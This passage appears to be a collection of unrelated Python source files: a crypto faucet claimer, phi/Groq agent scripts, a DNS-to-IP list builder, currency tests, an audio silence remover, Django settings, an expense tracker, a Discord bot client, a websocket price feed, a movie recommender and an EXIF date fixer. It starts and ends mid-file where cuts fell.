address {address}. Waiting 60 seconds\")\n                time.sleep(60)\n                return True\n            elif \"error\" in result and \"Too Many Requests\" in result[\"error\"]:\n                log_error(f\"    \u26a0\ufe0f Faucet already claimed for {address}, waiting for 1 minute before retrying...\")\n                time.sleep(60)\n            elif \"msg\" in result and \"nonce too high\" in result[\"msg\"]:\n                log_kuning(f\"    \u26a0\ufe0f Failed to claim faucet. Nonce too high {address}\")\n                return True\n            elif \"msg\" in result and \"exceeded\" in result[\"msg\"]:\n                log_error(f\"    \u274c Limit claim faucet for {address}. Waiting 60 seconds.\")\n   ",
    "from phi.agent import Agent\nfrom phi.model.groq import Groq\nfrom phi.tools.duckduckgo import DuckDuckGo\nfrom phi.tools.newspaper4k import Newspaper4k\nfrom phi.tools.yfinance import YFinanceTools\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nweb_searcher = Agent(\n    model=Groq(id=\"llama-3.3-70b-versatile\"),\n    name=\"Web Searcher\",\n    role=\"Searches the web for information on a topic\",\n    tools=[DuckDuckGo()],\n    markdown=True,\n    # add_datetime_to_instructions=True,\n)\n\narticle_reader = Agent(\n    model=Groq(id=\"llama-3.3-70b-versatile\"),\n    name=\"Article Reader\",\n    role=\"Reads articles from URLs.\",\n    tools=[Newspaper4k()],\n    markdown=True,\n)\n\nyahoo_finance_agent = Agent(\n    name=\"Yahoo Finance Agent\",\n    model=Groq(id=\"llama-3.3-70b-versatile\"),\n    tools=[\n        YFinanceTools(\n            stock_price=True,\n            analyst_recommendations=True,\n            company_info=True,\n            company_news=True,\n        )\n    ],\n    instructions=[\"Use tables to display data\"],\n    show_tool_calls=True,\n    markdown=True,\n)\n",
    "import json\nimport os\nimport re\nimport sys\nimport asyncio\nimport aiofiles\nimport dns.asyncresolver\nfrom datetime import datetime\n\nresolver = dns.asyncresolver.Resolver()\nresolver.nameservers = ['8.8.8.8', '8.8.4.4']\n\ndef alphanumeric_key(s):\n    return [int(text) if text.isdigit() else text.lower() for text in re.split('([0-9]+)', s)]\n\nasync def get_a_records(domain, retries=3, delay=1):\n    for attempt in range(retries):\n        try:\n            answer = await resolver.resolve(domain, 'A')\n            return domain, \" \".join([rdata.to_text() for rdata in answer]).split()[0]\n        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN) as e:\n            return domain, f\"Error: {str(e)}\"\n        except Exception as e:\n            if attempt < retries - 1:\n                await asyncio.sleep(delay)\n            else:\n                return domain, f\"Error: {str(e)}\"\n\nasync def process_domain(domain, results):\n    domain, a_records = await get_a_records(domain)\n    if a_records and \"Error\" not in a_records:\n        results.append({\"hostname\": domain, \"ip\": a_records})\n        print(f\"{domain} -> {a_records}\")\n\nasync def main():\n    tasks = []\n    results = []\n    max_concurrent_tasks = 1000\n    semaphore = asyncio.Semaphore(max_concurrent_tasks)\n\n    async def limited_task(domain):\n        async with semaphore:\n            await process_domain(domain, results)\n\n    # Read the list of domains from the file\n    try:\n        async with aiofiles.open(os.path.join(\"data\", 'base-domain-list.txt'), 'r') as f:\n            domains = await f.readlines()\n    except FileNotFoundError:\n        print(\"Domain list file not found.\")\n        sys.exit(1)\n\n    domains = [domain.strip() for domain in domains]  # Clean up line breaks\n\n    for domain in domains:\n        tasks.append(limited_task(domain))\n\n    await asyncio.gather(*tasks)\n\n    if len(results) == 0:\n        print(\"\\nNo results found.\")\n        return\n\n    # Display results instead of saving them\n    async with aiofiles.open(os.path.join(\"data\", 'base-ip-list.txt'), 'w') as f:\n        await f.write(\"\\n\".join(sorted(map(lambda a: a[\"ip\"], results), key=alphanumeric_key)) + \"\\n\")\n    \n    os.makedirs(\"amnezia\", exist_ok=True)\n    async with aiofiles.open(os.path.join(\"amnezia\", 'amnezia-base-list.json'), 'w') as f:\n        await f.write(json.dumps(sorted(results, key=lambda a: alphanumeric_key(a['hostname'])), indent=4))\n\nif __name__ == \"__main__\":\n    start_time = datetime.now()\n    asyncio.run(main())\n    end_time = datetime.now()\n    print(f\"\\nFinished! Time taken: {end_time - start_time}\")\n",
    "from decimal import Decimal\n\nimport pytest\n\nfrom currex import USD, currex_config  # type: ignore[attr-defined]\n\n\ndef test_basic_multiplication():\n    amount = 100 * USD\n    assert amount.code == USD.code\n    assert amount.amount == Decimal(\"100\")\n\n    amount = USD * 100\n    assert amount.code == USD.code\n    assert amount.amount == Decimal(\"100\")\n\n\ndef test_basic_division():\n    amount = USD(100) / 2\n    assert amount.code == USD.code\n    assert amount.amount == Decimal(\"50\")\n\n\ndef test_addition():\n    amount1 = 100 * USD\n    amount2 = 50 * USD\n    total = amount1 + amount2\n    assert total.code == USD.code\n    assert total.amount == Decimal(\"150\")\n\n\ndef test_subtraction():\n    amount1 = 100 * USD\n    amount2 = 30 * USD\n    diff = amount1 - amount2\n    assert diff.code == USD.code\n    assert diff.amount == Decimal(\"70\")\n\n\ndef test_comparison():\n    # Same currency comparisons\n    amount1 = 100 * USD\n    amount2 = 50 * USD\n    amount3 = 100 * USD\n\n    assert amount1 > amount2\n    assert amount2 < amount1\n    assert amount1 >= amount3\n    assert amount1 <= amount3\n    assert amount1 == amount3\n    assert amount1 != amount2\n\n\ndef test_string_representation():\n    amount = 42.42 * USD\n    assert str(amount).endswith(\"USD\")\n    assert \"42.42\" in str(amount)\n\n\ndef test_negative_amounts():\n    amount = -50 * USD\n    assert amount.amount == Decimal(\"-50\")\n\n    amount2 = 30 * USD\n    result = amount + amount2\n    assert result.amount == Decimal(\"-20\")\n\n\ndef test_zero_amount():\n    amount = 0 * USD\n    assert amount.amount == Decimal(\"0\")\n\n\ndef test_decimal_digits_configuration():\n    \"\"\"Test the decimal digits configuration for currency representation.\"\"\"\n    amount = USD(123.456789)\n\n    # Default (2 digits)\n    assert str(amount) == \"123.46 USD\"\n    assert repr(amount) == \"USD(123.46)\"\n\n    # Change to 3 digits\n    currex_config.set_decimal_digits(3)\n    assert str(amount) == \"123.457 USD\"\n    assert repr(amount) == \"USD(123.457)\"\n\n    # Change to no rounding (None)\n    currex_config.set_decimal_digits(None)\n    assert str(amount) == \"123.456789 USD\"\n    assert repr(amount) == \"USD(123.456789)\"\n\n    # Reset to default\n    currex_config.set_decimal_digits(2)\n    assert str(amount) == \"123.46 USD\"\n    assert repr(amount) == \"USD(123.46)\"\n\n\ndef test_invalid_decimal_digits():\n    \"\"\"Test that negative decimal digits raise ValueError.\"\"\"\n    with pytest.raises(ValueError):\n        currex_config.set_decimal_digits(-1)\n",
    "# \u5bfc\u5165\u5fc5\u8981\u7684\u5e93\nimport tkinter as tk  # \u7528\u4e8e\u521b\u5efa\u56fe\u5f62\u754c\u9762\nfrom tkinter import ttk, filedialog, messagebox  # \u7528\u4e8e\u6587\u4ef6\u9009\u62e9\u5bf9\u8bdd\u6846\u548c\u6d88\u606f\u63d0\u793a\u6846\nimport os  # \u7528\u4e8e\u6587\u4ef6\u8def\u5f84\u64cd\u4f5c\nimport threading\nimport subprocess  # \u6dfb\u52a0\u8fd9\u884c\nfrom pydub import AudioSegment  # \u7528\u4e8e\u97f3\u9891\u5904\u7406\nfrom pydub.silence import split_on_silence  # \u7528\u4e8e\u68c0\u6d4b\u548c\u5206\u5272\u9759\u97f3\u90e8\u5206\nimport sys  # \u6dfb\u52a0\u7cfb\u7edf\u7f16\u7801\u652f\u6301\n\ndef remove_silence(input_file, silence_thresh=-40, min_silence_len=50, keep_silence=100):\n    \"\"\"\n    \u79fb\u9664\u97f3\u9891\u6587\u4ef6\u4e2d\u7684\u9759\u97f3\u90e8\u5206\n    input_file: \u8f93\u5165\u97f3\u9891\u6587\u4ef6\u8def\u5f84\n    silence_thresh: \u9759\u97f3\u9608\u503c\uff08dB\uff09\uff0c\u4f4e\u4e8e\u6b64\u503c\u89c6\u4e3a\u9759\u97f3\n    min_silence_len: \u6700\u5c0f\u9759\u97f3\u957f\u5ea6\uff08\u6beb\u79d2\uff09\n    keep_silence: \u4fdd\u7559\u7684\u9759\u97f3\u957f\u5ea6\uff08\u6beb\u79d2\uff09\n    \"\"\"\n    try:\n        # \u8bfb\u53d6\u97f3\u9891\u6587\u4ef6\n        print(f\"Reading audio file: {input_file}\")\n        audio = AudioSegment.from_file(input_file)  # \u52a0\u8f7d\u97f3\u9891\u6587\u4ef6\n        print(f\"Audio duration: {len(audio)} ms\")  # \u6253\u5370\u97f3\u9891\u603b\u957f\u5ea6\n\n        # \u6253\u5370\u5904\u7406\u53c2\u6570\n        print(f\"Splitting audio with parameters: silence_thresh={silence_thresh}, min_silence_len={min_silence_len}, keep_silence={keep_silence}\")\n        \n        # \u5206\u5272\u97f3\u9891\uff0c\u53bb\u9664\u9759\u97f3\u90e8\u5206\n        audio_parts = split_on_silence(\n            audio,\n            min_silence_len=min_silence_len,  # \u6700\u5c0f\u9759\u97f3\u957f\u5ea6\n            silence_thresh=silence_thresh,     # \u9759\u97f3\u9608\u503c\n            keep_silence=keep_silence          # \u4fdd\u7559\u7684\u9759\u97f3\u957f\u5ea6\n        )\n        print(f\"Number of audio parts after splitting: {len(audio_parts)}\")  # \u6253\u5370\u5206\u5272\u540e\u7684\u7247\u6bb5\u6570\u91cf\n\n        # \u5408\u5e76\u6240\u6709\u975e\u9759\u97f3\u7247\u6bb5\n        combined = AudioSegment.empty()  # \u521b\u5efa\u7a7a\u7684\u97f3\u9891\u6bb5\n        for i, part in enumerate(audio_parts):\n            combined += part  # \u6dfb\u52a0\u6bcf\u4e2a\u975e\u9759\u97f3\u7247\u6bb5\n            print(f\"Added part {i+1}, current duration: {len(combined)} ms\")\n\n        # \u751f\u6210\u8f93\u51fa\u6587\u4ef6\u8def\u5f84\uff08\u5728\u539f\u6587\u4ef6\u540c\u76ee\u5f55\u4e0b\uff0c\u6dfb\u52a0\"_no_silence\"\u540e\u7f00\uff09\n        output_file = os.path.join(\n            os.path.dirname(input_file), \n            os.path.splitext(os.path.basename(input_file))[0] + \"_no_silence.mp3\"\n        )\n        \n        # \u5bfc\u51fa\u5904\u7406\u540e\u7684\u97f3\u9891\n        print(f\"Exporting processed audio to: {output_file}\")\n        combined.export(output_file, format=\"mp3\", bitrate=\"192k\")\n        \n        # \u6253\u5370\u5904\u7406\u7ed3\u679c\n        print(f\"Export completed. Final duration: {len(combined)} ms\")\n        print(f\"Silence removed: {len(audio) - len(combined)} ms\")\n\n        return output_file\n\n    except Exception as e:\n        # \u9519\u8bef\u5904\u7406\n        print(f\"An error occurred: {str(e)}\")\n        return None\n\nclass SilenceRemoverGUI:\n    def __init__(self, root):\n        self.root = root\n        self.root.title(\"\u81ea\u52a8\u526a\u8f91\u6c14\u53e3\u5de5\u5177 \u4f5c\u8005@\u7530\u540c\u5b66Tino\")\n        self.root.geometry(\"600x400\")\n        self.root.resizable(False, False)\n        \n        # \u8bbe\u7f6e\u5e94\u7528\u56fe\u6807\n        self.set_app_icon()\n        \n        # \u521b\u5efa\u4e3b\u6846\u67b6\n        self.main_frame = ttk.Frame(self.root, padding=\"10\")\n        self.main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))\n        \n        # \u6587\u4ef6\u9009\u62e9\u90e8\u5206\n        self.file_frame = ttk.LabelFrame(self.main_frame, text=\"\u6587\u4ef6\u9009\u62e9\", padding=\"5\")\n        self.file_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        \n        self.file_path = tk.StringVar()\n        self.file_entry = ttk.Entry(self.file_frame, textvariable=self.file_path, width=50)\n        self.file_entry.grid(row=0, column=0, padx=5)\n        \n        self.browse_button = ttk.Button(self.file_frame, text=\"\u6d4f\u89c8\", command=self.browse_file)\n        self.browse_button.grid(row=0, column=1, padx=5)\n        \n        # \u53c2\u6570\u8bbe\u7f6e\u90e8\u5206\n        self.params_frame = ttk.LabelFrame(self.main_frame, text=\"\u53c2\u6570\u8bbe\u7f6e\", padding=\"5\")\n        self.params_frame.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)\n        \n        # \u9759\u97f3\u9608\u503c\u8bbe\u7f6e\n        ttk.Label(self.params_frame, text=\"\u9759\u97f3\u9608\u503c (dB):\").grid(row=0, column=0, padx=5)\n        self.silence_thresh = tk.IntVar(value=-40)\n        self.thresh_scale = ttk.Scale(\n            self.params_frame,\n            from_=-60,\n            to=-20,\n            variable=self.silence_thresh,\n            orient=tk.HORIZONTAL,\n            command=lambda x: self.update_scale_value(self.silence_thresh, self.thresh_entry)\n        )\n        self.thresh_scale.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)\n        self.thresh_entry = ttk.Entry(self.params_frame, width=5)\n        self.thresh_entry.insert(0, \"-40\")\n        self.thresh_entry.grid(row=0, column=2, padx=5)\n        self.thresh_entry.bind('<Return>', lambda e: self.update_entry_value(\n            self.thresh_entry, self.silence_thresh, -60, -20))\n        \n        # \u6700\u5c0f\u9759\u97f3\u957f\u5ea6\u8bbe\u7f6e\n        ttk.Label(self.params_frame, text=\"\u6700\u5c0f\u9759\u97f3\u957f\u5ea6 (ms):\").grid(row=1, column=0, padx=5)\n        self.min_silence = tk.IntVar(value=50)\n        self.min_scale = ttk.Scale(\n            self.params_frame,\n            from_=0,\n            to=500,\n            variable=self.min_silence,\n            orient=tk.HORIZONTAL,\n            command=lambda x: self.update_scale_value(self.min_silence, self.min_entry)\n        )\n        self.min_scale.grid(row=1, column=1, sticky=(tk.W, tk.E), padx=5)\n        self.min_entry = ttk.Entry(self.params_frame, width=5)\n        self.min_entry.insert(0, \"50\")\n        self.min_entry.grid(row=1, column=2, padx=5)\n        self.min_entry.bind('<Return>', lambda e: self.update_entry_value(\n            self.min_entry, self.min_silence, 0, 500",
    "from phi.agent import Agent\nfrom phi.model.groq import Groq\nfrom agents import web_searcher, article_reader, yahoo_finance_agent\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nagent = Agent(\n    model=Groq(id=\"llama-3.3-70b-versatile\"),\n    name=\"Cryptocurrency Analyst\",\n    team=[web_searcher, article_reader, yahoo_finance_agent],\n    instructions=[\n        \"1. Use the web searcher to find the latest news.\",\n        \"2. Provide the article reader with the top links from the search results to gather important information.\",\n        \"3. Ensure the article reader reviews the links to extract key details.\",\n        \"4. Use the Yahoo Finance agent to retrieve detailed information and analysis.\",\n        \"5. Provide a summary of the analyst recommendations, including quantitative data in a table.\",\n        \"6. Offer investment advice based on the gathered information, presented in a table.\",\n        \"7. Provide both bullish and bearish signals\",\n    ],\n    # reasoning=True,\n    debug_mode=True,\n    show_tool_calls=True,\n    markdown=True,\n)\n\nagent.print_response(\"Analyze Bitcoin symbol=BTC for potential investment opportunities backed by data.\", stream=True)\n",
    "from pathlib import Path\nfrom decouple import config\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = config('SECRET_KEY')\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = config('DEBUG', default=False, cast=bool)\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'rest_framework',\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'backend_api.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'backend_api.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/5.1/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        #'ENGINE': 'django.db.backends.sqlite3',\n        #'NAME': BASE_DIR / 'db.sqlite3',\n        'ENGINE': 'django.db.backends.postgresql',\n        'NAME': config('DB_NAME'),\n        'USER': config('DB_USER'),\n        'PASSWORD': config('DB_PASSWORD'),\n        'HOST': config('DB_HOST', default='localhost'),\n        'PORT': config('DB_PORT', default=5432, cast=int),\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.1/howto/static-files/\n\nSTATIC_URL = 'static/'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.1/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "from file_manager import initialize_expenses_file\nfrom expense_manager import add_expense, view_expenses, monthly_summary, delete_expense\n\ndef main():\n    initialize_expenses_file()\n    \n    while True:\n        print(\"\\nWelcome to Personal Expense Tracker!\")\n        print(\"1. Add Expense\")\n        print(\"2. View Expenses\")\n        print(\"3. Monthly Summary\")\n        print(\"4. Delete Expense\")\n        print(\"5. Exit\")\n        \n        choice = input(\"Enter your choice: \")\n        \n        if choice == '1':\n            category = input(\"Enter category (e.g., Food, Travel): \")\n            amount = input(\"Enter amount: \")\n            date = input(\"Enter date (YYYY-MM-DD): \")\n            add_expense(category, amount, date)\n        \n        elif choice == '2':\n            view_expenses()\n        \n        elif choice == '3':\n            year = int(input(\"Enter year (YYYY): \"))\n            month = int(input(\"Enter month (1-12): \"))\n            monthly_summary(year, month)\n        \n        elif choice == '4':\n            category = input(\"Enter category of the expense to delete: \")\n            amount = input(\"Enter amount of the expense to delete: \")\n            date = input(\"Enter date (YYYY-MM-DD) of the expense to delete: \")\n            delete_expense(category, amount, date)\n        \n        elif choice == '5':\n            print(\"Exiting the program. Goodbye!\")\n            break\n        \n        else:\n            print(\"Invalid choice. Please try again.\")\n\nif __name__ == \"__main__\":\n    main()",
    "import discord\r\nfrom discord.ext import commands\r\nimport asyncio\r\nimport json5\r\nfrom art import text2art\r\nimport os\r\nfrom colorama import init, Fore\r\nfrom collections import deque\r\nimport time\r\nfrom PIL import Image\r\n\r\n\r\ninit()\r\n\r\nwith open(\"config.json5\", \"r\") as config_file:\r\n    config = json5.load(config_file)\r\n\r\nPREFIX = config.get(\"prefix\")\r\nPING = config.get(\"ping\")\r\n\r\nSTATUS_MODE = config.get(\"status_mode\")\r\nSTATUS_CONTENT = config.get(\"status_content\")\r\n\r\nLIBRUARY_PATH = config.get(\"library_path\")\r\nLIBRUARY_STATUS = config.get(\"library_status\")\r\n\r\nintents = discord.Intents.all()\r\n\r\nif len(PREFIX) > 4:\r\n    PREFIX = \"dfb.\"\r\n\r\nbot = commands.Bot(command_prefix=PREFIX, intents=intents)\r\n\r\n\r\nclass InfoButtom(discord.ui.View):\r\n    def __init__(self):\r\n        super().__init__(timeout=None)\r\n\r\n    @discord.ui.button(label=\"Discord For Bots\", style=discord.ButtonStyle.gray)\r\n    async def info(self, interaction: discord.Interaction, button: discord.ui.Button):\r\n        embed = discord.Embed(description=f\"Discord For Bots is an unofficial open source program that lets you run discord as your own app! Want to download it? You can find the exe file and the code on [github]( https://github.com/stainowy/DiscordForBots)!\", color=0x0e3972) \r\n        await interaction.response.send_message(embed=embed, ephemeral=True)\r\n\r\ndef clear_console():\r\n    command = 'cls' if os.name == 'nt' else 'clear'\r\n    os.system(command)\r\n\r\ndef start_widget():\r\n    title = text2art(\"Discord For Bots\")\r\n    print(f\"{Fore.LIGHTBLUE_EX}{title}\")\r\n    print(f\"{Fore.CYAN}GITHUB {Fore.WHITE} https://github.com/stainowy/DiscordForBots\")\r\n    print(f\"{Fore.CYAN}AUTHOR {Fore.WHITE} https://stainowy.gihub.io\")\r\n    print(\"\")\r\n\r\n\r\nasync def get_debug(content: str):\r\n    STATUS = config.get(\"debug\")\r\n    if STATUS == \"ON\":\r\n        print(f\"{Fore.GREEN}DEBUG {Fore.WHITE} {content}\")\r\n    else:\r\n        pass\r\n\r\nasync def get_error(content: str):\r\n    print(f\"{Fore.RED}ERROR {Fore.WHITE} {content}\")\r\n\r\nasync def get_keypress():\r\n    loop = asyncio.get_event_loop()\r\n    return await loop.run_in_executor(None, input, \"\")\r\n\r\n@bot.command(name=\"ping\")\r\nasync def ping(ctx):\r\n    start_time = time.time()\r\n    COMMAND = config.get(\"commands\")\r\n    if COMMAND == \"ON\":\r\n        try:\r\n            await get_debug(f\"User '{ctx.author.name}' used a command '{PREFIX}ping'\")\r\n            bot_ping = round(bot.latency * 1000)\r\n            end_time = time.time()\r\n            client_ping = round((end_time - start_time) * 1000)\r\n            embed = discord.Embed(description=f\"> Bot ping: ``{bot_ping}ms``\\n> Client ping: ``{client_ping}ms``\")\r\n            await ctx.send(embed=embed, view=InfoButtom())\r\n            \r\n        except Exception as e:\r\n            await get_error(e)\r\n    else:\r\n        await get_debug(f\"User '{ctx.author.name}' tried to use the '{PREFIX}ping' command but it is disabled in the config\")\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.content.strip() == f'<@{bot.user.id}>' or message.content.strip() == f'<@!{bot.user.id}>':\r\n        if PING == \"ON\":\r\n            embed = discord.Embed(description=f\"Hi, I'm {bot.user.name}. And I'm an application launched with DiscordForBots :)\", color=0x0e3972) \r\n            await message.channel.send(f'{message.author.mention}', embed=embed, view=InfoButtom())\r\n            await get_debug(f\"User '{message.author.name}' used a command '@ping'\")\r\n        else:\r\n            await get_debug(f\"User '{message.author.name}' tried to use the '@ping' command but it is disabled in the config\")\r\n            pass\r\n\r\n\r\nasync def get_user_id_or_nick(input_value, bot):\r\n    if input_value.startswith(\"@\"):\r\n        nick = input_value[1:]\r\n        for guild in bot.guilds:\r\n            member = discord.utils.get(guild.members, name=nick)\r\n            if member:\r\n                return member.id\r\n        await get_error(f\"User with nickname '{nick}' not found!\")\r\n        raise ValueError(\"User not found.\")\r\n    else:\r\n        try:\r\n            return int(input_value)\r\n        except ValueError:\r\n            await get_error(\"Invalid user ID format!\")\r\n            raise ValueError(\"Invalid ID.\")\r\n\r\n\r\nasync def select_options():\r\n    print(f\" {Fore.CYAN}[1] {Fore.WHITE}Browse servers\")\r\n    print(f\" {Fore.CYAN}[2] {Fore.WHITE}Send DM\")\r\n    print(f\" {Fore.CYAN}[3] {Fore.WHITE}Edit Profile\")\r\n    while True:\r\n        key = await get_keypress()\r\n        if key == \"1\":\r\n            clear_console()\r\n            start_widget()\r\n            await show_server_selection()\r\n        elif key == \"2\":\r\n            clear_console()\r\n            start_widget()\r\n            await select_user()\r\n        elif key == \"3\":\r\n            clear_console()\r\n            start_widget()\r\n            await select_action()\r\n        else:\r\n            await get_error(\"Invalid option!\")\r\n\r\n# - - - - - - - - - - - - - - - - - - - - - -  Profile  - - - - - - - - - - - - - - - - - - - - - - #\r\n\r\nasync def select_action():\r\n    print(f\" {Fore.CYAN}[1] ",
    "import asyncio\nimport websockets\nimport os\nimport json\nimport logging\nfrom dotenv import load_dotenv\n\nlogging.basicConfig(\n    format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\", level=logging.INFO\n)\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\nlogger = logging.getLogger(__name__)\n\nload_dotenv()\napi_url = os.getenv('API_URL')\napi_key = os.getenv('API_KEY')\napi_secret = os.getenv('API_SECRET')\n\n\nasync def get_mark_price(market_code):\n    try:\n        async with websockets.connect(f\"wss://{api_url}/v2/websocket\") as websocket:\n            while True:\n                if not websocket.open:\n                    logger.info(\"websocket disconnected\")\n                    try:\n                        await websocket.close()\n                    except Exception as e:\n                        pass\n                    websocket = await websockets.connect(f\"wss://{api_url}/v2/websocket\")\n                response = await websocket.recv()\n                res = json.loads(response)\n                if 'success' in res and res['success'] is False:\n                    logger.warning(res)\n                    break\n\n                if 'nonce' in res:\n                    await websocket.send(json.dumps({\n                        \"op\": \"subscribe\",\n                        \"tag\": 1,\n                        \"args\": [f\"market:{market_code}\"]\n                    }))\n                if 'data' in res and len(res['data']) > 0:\n                    logger.info(res['data'][0])\n                    await asyncio.sleep(1)\n    except Exception as e:\n        logger.error(f\"Exception: {str(e)}\")\n        try:\n            await websocket.close()\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    try:\n        asyncio.run(get_mark_price(\"BTC-USD-SWAP-LIN\"))\n    except Exception as e:\n        logger.error(f\"Exception: {str(e)}\")\n",
    "# movie recommendation system using cosine similarity\n\n# importing the dependencies\nimport numpy as np\nimport pandas as pd\nimport difflib\nfrom sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer\nfrom sklearn.metrics.pairwise import cosine_similarity\n\n# reading the dataset\n# loading the dataset\nmovies=pd.read_csv(r'C:\\Users\\csvis\\.vscode\\ML projects\\Movie_recommend\\movies.csv')\n# displaying the first few rows of the dataset\nmovies.head()\n\n#displaying the shape of the dataset\nmovies.shape\n\n#displaying the column of the dtaaset\nmovies.columns\n\n#displaying the information of the dataset\nmovies.info()\n\nmovies.describe()\n\n# checking for the missing values\nmovies.isnull().sum()\n\n# checking for the missing values\nmovies.isnull().sum()\n\n# creating a Tfidf Vectorizer to convert the text data into a matrix of TF-IDF features\ntfdif=TfidfVectorizer(stop_words='english')\n\n#replace the NaN values with an empty string\nmovies['genres']=movies['genres'].fillna('')\n\n#Construct the required TF-IDF matrix by fitting and transforming the data\ntfdif_matrix=tfdif.fit_transform(movies['genres'])\n\n#output the shape of tfdif_matrix\ntfdif_matrix.shape\n\n#computing the cosine similarity on tfdif_matrix\ncosine_sim=cosine_similarity(tfdif_matrix, tfdif_matrix)\n\n#displaying the cosine similarity matrix\ncosine_sim\n\n\n\n",
    "import os\nimport platform\nfrom datetime import datetime\n\nimport pywintypes\nimport win32con\nimport win32file\nfrom PIL import Image\nfrom PIL.ExifTags import TAGS\nfrom tqdm import tqdm\n\n\ndef get_exif_metadata(image_path):\n    try:\n        with Image.open(image_path) as img:\n            exif_data = img._getexif()\n            if exif_data is not None:\n                return {TAGS.get(tag, tag): value for tag, value in exif_data.items()}\n    except Exception as e:\n        print(f\"Error reading EXIF data from {image_path}: {e}\")\n    return {}\n\n\ndef changeFileCreationTime(fname, newtime):\n    if platform.system() == \"Windows\":\n        # os.utime(file_path, (new_creation_unixtime, modification_unixtime))\n        # https://www.tutorialspoint.com/how-to-set-creation-and-modification-date-time-of-a-file-using-python\n\n        wintime = pywintypes.Time(newtime)\n        winfile = win32file.CreateFile(\n            fname,\n            win32con.GENERIC_WRITE,\n            win32con.FILE_SHARE_READ\n            | win32con.FILE_SHARE_WRITE\n            | win32con.FILE_SHARE_DELETE,\n            None,\n            win32con.OPEN_EXISTING,\n            win32con.FILE_ATTRIBUTE_NORMAL,\n            None,\n        )\n\n        win32file.SetFileTime(winfile, wintime, None, None)\n\n        winfile.close()\n    else:\n        print(\"Updating creation time not supported on this platform}\")\n\n\ndef update_file_creation_date(file_path):\n    stat = os.stat(file_path)\n\n    # https://docs.python.org/3/library/stat.html\n    modification_unixtime = stat.st_mtime\n    creation_unixtime = stat.st_birthtime\n\n    new_creation_unixtime = creation_unixtime\n\n    if file_path.lower().endswith((\".png\", \".jpg\", \".jpeg\", \".tiff\", \".bmp\", \".gif\")):\n        exif_metadata = get_exif_metadata(file_path)\n    else:\n        exif_metadata = {}\n\n    capture_date = exif_metadata.get(\"DateTime\")\n\n    # convert capture_date to unix timestamp\n    if capture_date is not None:\n        try:\n            capture_date = datetime.strptime(capture_date, \"%Y:%m:%d %H:%M:%S\")\n            capture_unix_time = capture_date.timestamp()\n        except Exception as e:\n            print(f\"Error converting capture_date to unixtime for {file_path}: {e}\")\n            capture_unix_time = datetime.now().timestamp()\n\n        new_creation_unixtime = min(\n            creation_unixtime, modification_unixtime, capture_unix_time\n        )\n    else:\n        new_creation_unixtime = min(creation_unixtime, modification_unixtime)\n\n    # update only if date is not 1970-01-01 fake dates and lower than current creation date\n    if new_creation_unixtime > 1 and new_creation_unixtime < creation_unixtime:\n        try:\n            # convert unix time to human readable format\n            creation_humantime = datetime.fromtimestamp(creation_unixtime).strftime(\n                \"%Y-%m-%d %H:%M:%S\"\n            )\n            new_creation_humantime = datetime.fromtimestamp(\n                new_creation_unixtime\n            ).strftime(\"%Y-%m-%d %H:%M:%S\")\n            print(\n                f\"Updated creation time from {creation_humantime} to {new_creation_humantime} for {file_path}\"\n            )\n\n            # do change\n            changeFileCreationTime(file_path, new_creation_unixtime)\n\n        except Exception as e:\n            print(f\"Error updating creation time for {file_path}: {e}\")\n            # add to log file\n            with open(\"error_log.txt\", \"a\") as f:\n                f.write(f\"Error updating creation time for {file_path}: {e}\\n\")\n\n\ndef main(directory):\n    # get all files in directory\n    all_files = []\n    for root, _, files in 